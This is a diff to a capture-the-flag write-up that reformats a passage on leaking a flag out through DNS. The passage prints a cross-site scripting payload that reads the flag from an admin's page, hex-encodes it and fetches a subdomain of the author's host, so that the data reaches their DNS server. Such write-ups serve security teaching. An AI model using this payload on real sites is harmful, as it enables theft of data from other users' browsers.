@@ -78,9 +78,18 @@ Instead of `HelloWorld`, we just had to put something in there, like `<script>..
 
 we had to leak the flag out with only DNS requests. However, unlike the first time around, where we got to specify the IP address of the DNS server, this time we couldn't do that and we had to actually get the public DNS system to route a DNS request from the admin's browser to our dnschef server, where we could then retreive the flag from the request.
 
-First, we needed to construct a DNS query that would leak the flag. We did that with essentially this `fetch(http:// + getflagfromadminsHTML().hexencode() + .cd481af3fd77.us.to)` or
+First, we needed to construct a DNS query that would leak the flag. We did that with essentially this
 
-`<script>fetch("http://"+document.getElementById('flag').innerText.replaceAll(/./g,(m)=>m.charCodeAt(0).toString(16)).slice(35,90)+'zz'+Math.floor(Math.random()*Math.floor(10000))+".cd481af3fd77.us.to");</script>`{:.nowrap2}
+```js
+fetch(http:// + getflagfromadminsHTML().hexencode() + .cd481af3fd77.us.to)
+```
+or
+```js
+<script>fetch("http://"+document.getElementById('flag')
+.innerText.replaceAll(/./g,(m)=>m.charCodeAt(0).toString(16))
+.slice(35,90)+'zz'+Math.floor(Math.random()*Math.floor(10000))
++".cd481af3fd77.us.to");</script>
+```
 
 So when the admin would log in and view the site, they would end up executing a fetch to a domain name that had the flag inside it, and we would receive the request at our server.
 
